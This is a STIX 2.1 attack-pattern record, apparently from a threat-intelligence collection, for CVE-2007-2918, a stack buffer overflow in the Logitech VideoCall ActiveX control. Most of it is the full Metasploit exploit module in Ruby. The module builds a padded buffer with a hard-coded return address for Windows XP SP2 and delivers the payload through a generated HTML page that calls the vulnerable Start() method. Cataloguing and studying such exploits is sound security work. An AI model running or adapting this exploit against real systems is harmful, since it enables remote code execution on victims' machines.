{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d9538d36-dc5f-4ccd-ba67-0475017f0898",
    "created": "2024-08-14T16:40:00.0381Z",
    "modified": "2024-08-14T16:40:00.038104Z",
    "name": "Logitech VideoCall ActiveX Control Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the Logitech VideoCall ActiveX Control (wcamxmp.dll 2.0.3470.448). By sending an overly long string to the \"Start()\" method, an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/logitechvideocall_start.rb",
            "external_id": "logitechvideocall_start.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-2918"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Logitech VideoCall ActiveX Control Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the Logitech VideoCall ActiveX\n        Control (wcamxmp.dll 2.0.3470.448). By sending an overly long string to the\n        \"Start()\" method, an attacker may be able to execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2007-2918' ],\n          [ 'OSVDB', '36820'],\n          [ 'BID', '24254' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 800,\n          'BadChars'      => \"\\x00\\x09\\x0a\\x0d'\\\\\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP Pro SP2 English',     { 'Offset' => 120, 'Ret' => 0x7c941eed } ],\n        ],\n      'DisclosureDate' => '2007-05-31',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Randomize some things\n    vname\t= rand_text_alpha(rand(100) + 1)\n    strname\t= rand_text_alpha(rand(100) + 1)\n\n    # Set the exploit buffer\n    sploit = rand_text_alpha(target['Offset']) + [target.ret].pack('V') + p.encoded\n\n    # Build out the message\n    content = %Q|\n      <html>\n      <object classid='clsid:BF4C7B03-F381-4544-9A33-CB6DAD2A87CD' id='#{vname}'></object>\n      <script language='javascript'>\n      var #{vname} = document.getElementById('#{vname}');\n      var #{strname} = new String('#{sploit}');\n      #{vname}.Start(#{vname}, #{vname}, #{strname});\n      </script>\n      </html>\n      |\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-05-31",
    "x_mitre_platforms": [
        "win'"
    ]
}